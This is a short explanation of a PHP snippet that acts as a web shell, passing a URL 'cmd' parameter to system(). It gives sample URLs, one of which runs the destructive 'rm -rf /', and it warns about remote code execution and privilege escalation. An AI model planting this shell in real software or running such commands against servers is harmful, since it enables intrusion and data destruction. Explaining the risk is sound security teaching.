### Code Behavior

```php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = $_GET['cmd'];      // Takes input directly from the URL query string
    system($cmd);             // Executes the command on the server
    echo "</pre>";
}
```

### Example Usage

Visiting:

```
http://example.com/script.php?cmd=ls
```

Would output the result of the `ls` command on the server.

### ⚠️ Security Implications

* **Remote Code Execution (RCE):** Any user can run **arbitrary commands** on the server.
* **No Input Validation or Sanitization:** This means attackers can execute destructive commands, e.g.:

  ```
  http://example.com/script.php?cmd=rm+-rf+/
  ```
* **Privilege Escalation Risks:** If the web server runs as a privileged user (e.g., root), this can be catastrophic.
